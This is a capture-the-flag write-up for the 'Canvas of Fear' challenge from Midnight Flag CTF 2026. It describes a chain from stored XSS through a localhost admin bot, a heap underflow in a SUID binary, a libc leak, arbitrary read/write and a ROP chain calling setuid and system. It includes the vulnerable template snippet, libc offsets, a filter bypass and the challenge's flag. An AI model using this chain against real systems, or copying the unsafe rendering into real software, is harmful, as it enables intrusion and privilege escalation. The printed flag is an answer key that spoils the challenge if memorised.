---
title: "Canvas of Fear"
description: "Stored XSS → localhost admin → heap underflow in a native canvas manager → libc leak → arbitrary R/W → libc ROP → flag. A full web-to-pwn chain."
event: "Midnight Flag CTF 2026"
year: 2026
category: web
tags: ["xss", "heap", "glibc-2.34", "ROP", "web-to-pwn", "flask"]
difficulty: hard
date: "2026-03-15"
sourceRepo: "R3izorr/CTF_writeup"
sourcePath: "Midnightctf_2026/Canvas_of_fear/Canvas_of_fear"
featured: true
flagsHidden: false
---

> Stored XSS inside an admin-only Flask template gives a bot access to
> localhost-only canvas APIs. Those APIs drive a native `canvas_manager`
> binary with a heap underflow, which becomes libc leak + arbitrary
> read/write + a libc ROP chain run from `main`'s saved RIP. The flag is
> written to `/app/static/<token>` and fetched over plain HTTP.

Full solvers (`solve.py` and `solve_web.py`) live in the
[source repository](https://github.com/R3izorr/CTF_writeup/tree/main/Midnightctf_2026/Canvas_of_fear/Canvas_of_fear).

## Triage

```bash
$ checksec --file=./canvas_manager
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
```

Bundled libc: **glibc 2.34**. GOT overwrites are dead, stack shellcode is dead, code addresses are randomized. Expect: bug → leak → libc → code reuse.

## Application layout

`server.py` splits into two worlds:

- **Public routes** — anyone can `POST /api/message` with `author` + `content`.
- **Localhost-only routes** — `/admin/messages`, `/api/canvas/*`. Blocked for everyone except `127.0.0.1`.

The admin template renders user-controlled fields with `|safe`:

```html
<div class="author">{{ (msg.author or 'Anonymous') | safe }}</div>
<div class="content">{{ (msg.content or '') | safe }}</div>
```

That's **stored XSS**, not SSTI — `<script>` runs, `{{7*7}}` does not.

`bot/bot.js` launches Chromium and periodically loads `http://127.0.0.1:5080/admin/messages`. So any stored XSS executes with localhost admin authority and can hit all canvas APIs.

The Dockerfile makes `/app/canvas_manager` and `/app/read_flag` SUID root. `/flag.txt` is root-only.

## Reversing `canvas_manager`

Each canvas is a heap struct:

```c
struct canvas {
    uint32_t id;
    uint32_t width;
    uint32_t height;
    uint32_t pad;
    uint8_t *pixels;
};
```

`cmd_create()` allocates two chunks: `malloc(0x18)` for the struct, `calloc(width * height * 3, 1)` for pixels.

The bug lives in `cmd_set()`:

```c
param_2 = param_3 * piVar1[1] + param_2;
if (param_2 < piVar1[1] * piVar1[2]) {
    // writes pixels + (param_2 * 3)
}
```

`index = y * width + x` is only bounds-checked against the upper bound. No lower bound. So `x = -10, y = 0` computes `index = -10`, passes `-10 < width * height`, and writes to `pixels + (-10 * 3)` — a heap **underflow**.

`cmd_get()` trusts the canvas's own `width`/`height`. Writing those fields via the underflow lets us turn the write into an over-read later.

## Heap layout

The exploit pins canvas creation order:

```text
CREATE 2 1 1     # corruptible / leaking canvas
CREATE 3 50 50   # 50*50*3 = 7500 bytes → unsorted-bin when freed
CREATE 4 1 1    # stable helper
```

After a restart these allocations are deterministic:

```text
[c2 struct][c2 pixels][c3 struct][c3 pixels][c4 struct][c4 pixels]
```

With canvas 2 at `1x1`, negative-index `SET 2` can overwrite its own `width` and `height` to `0x1b, 1`. Now `GET 2` returns `0x1b * 3 = 81` bytes starting from the tiny pixel buffer, reaching into the neighbours.

## Libc leak

Canvas 3's pixel chunk (`7500` bytes) is larger than the tcache ceiling. `DELETE 3` pushes it into the unsorted bin, where glibc writes `fd`/`bk` pointing at `main_arena + 0x60`. The over-read on canvas 2 sees that pointer at `blob[0x40:0x48]`. For this bundled libc, `main_arena = 0x1edc60`, so:

```text
libc_base = unsorted_fd - 0x1edcc0
```

## Arbitrary R/W

Once canvas 2's `pixels` pointer is attacker-controlled, `SET 2` / `GET 2` operate on arbitrary memory. But that breaks canvas 2's own struct as a stable edit target, so canvas 4 is used as a **stable writer** — its pixel-buffer-to-struct-of-canvas-2 distance is fixed. Negative-index `SET 4` edits canvas 2's `width` / `height` / `pixels` repeatedly:

```text
repoint canvas 2 -> addr
GET 2           -> arbitrary read
SET 2           -> arbitrary write
repoint again   -> repeat
```

## Stack leak and RIP control

Read `libc.sym.environ` (`libc_base + 0x1f5ec0`) → stack pointer. Scan nearby memory for the saved return address of `main`:

```text
RET_AFTER_MAIN = libc_base + 0x2d1d7
```

Once that 8-byte value is located, write a libc ROP chain over it and trigger `EXIT`.

## The chain

For the pure binary path:

```text
ret
pop rdi ; ret
0
setuid
ret
pop rdi ; ret
command_string
system
exit
```

For the web path, an interactive shell is overkill. `/app/read_flag` is SUID root and Flask serves `/app/static/*` automatically, so the command string is:

```bash
mkdir -p /app/static
/app/read_flag > /app/static/<token>
chmod 644 /app/static/<token>
```

## Bypassing the `-` filter

Flask refuses commands containing a literal `-`:

```python
if '-' in str(command):
    return "Hehehe nice try..."
```

But the backend parses indices with `%d`, so 32-bit wraparound works: `-10` → `4294967286`, `-9` → `4294967287`, etc. Signed interpretation in the binary still yields the underflow.

## End-to-end

1. **XSS**: `POST /api/message` with a payload in `content`.
2. **Bot**: hits `/admin/messages`, XSS runs as localhost admin.
3. **Heap**: build `2/3/4`, corrupt canvas 2, over-read, free canvas 3, leak libc, use canvas 4 as a stable writer.
4. **Stack**: read `environ`, find `RET_AFTER_MAIN`, overwrite with ROP.
5. **Trigger**: call `EXIT`, `main` returns into the chain, `/app/read_flag` dumps the flag to `/app/static/<token>`, attacker GETs it over HTTP.

Remote flag:

```text
MCTF{Wh3n_Fe4r_3sc4p3_Th3_C4NV4S}
```

## Why it's a good challenge

The binary bug alone is not enough. Solving it requires understanding **three** layers:

- the web frontend (stored XSS)
- the admin bot (localhost authority)
- the native heap (underflow + leak + R/W + ROP)

That is the realistic shape of web-to-native exploit chains in the wild.
